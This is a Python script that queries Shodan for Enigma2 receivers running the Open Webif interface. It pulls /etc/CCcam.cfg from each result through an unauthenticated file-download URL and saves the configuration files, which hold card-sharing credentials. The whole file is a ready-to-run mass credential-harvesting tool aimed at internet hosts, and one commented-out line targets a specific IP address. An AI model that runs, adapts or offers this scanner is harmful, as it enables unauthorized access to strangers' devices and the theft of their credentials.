#!/usr/bin/env python
#
# engima2_cline.py
# Search SHODAN for Engima 2 CCcam Config
#
# Author: random_robbie

import shodan
import sys
import re
import requests
from time import sleep

# Configuration
API_KEY = "YOURSHODANAPIKEY"
SEARCH_FOR = "title:'Open Webif'"
FILE = "/etc/CCcam.cfg"
session = requests.Session()

def filter_result(str):
	str.strip() #trim
	str.lstrip() #ltrim
	str.rstrip() #rtrim
	return str

def grab_file (IP,PORT,FILE):
	print ("[*] Testing: "+IP+" on Port: "+PORT+"[*]\n")
	try:
		if PORT == "80":
			URL = "http://"+IP+"/file?action=download&file="+FILE+""
			
		if PORT == "443":
			URL = "https://"+IP+"/file?action=download&file="+FILE+""
			
		if PORT == "8443":
			URL = "https://"+IP+"/file?action=download&file="+FILE+""
		else:
			URL = "http://"+IP+":"+PORT+"/file?action=download&file="+FILE+""
		
		headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1"}
		response = session.get(URL, headers=headers, timeout=15, verify=False)
		result = response.text
		if "not found" not in result:
			details = filter_result(result)
			text_file = open("./cfg/"+IP+"-CCcam.cfg", "a")
			text_file.write(""+result+"\n")
			text_file.close()
			print ("[*] OOOOH we have a CCcam config... [*]\n")
	except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
			
	except Exception as e:
		print (e)
		print ("[*] Nothing Found on IP:"+IP+" [*]\n")
	
#grab_file ("86.131.5.61","80",FILE)
#exit()


	
	
try:
        # Setup the api
		api = shodan.Shodan(API_KEY)

        # Perform the search
		result = api.search(SEARCH_FOR)

        # Loop through the matches and print each IP
		for service in result['matches']:
				IP = service['ip_str']
				PORT = str(service['port'])
				CC = service['location']['country_name']
				grab_file (IP,PORT,FILE)
except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
				
except Exception as e:
		print('Error: %s' % e)
		sys.exit(1)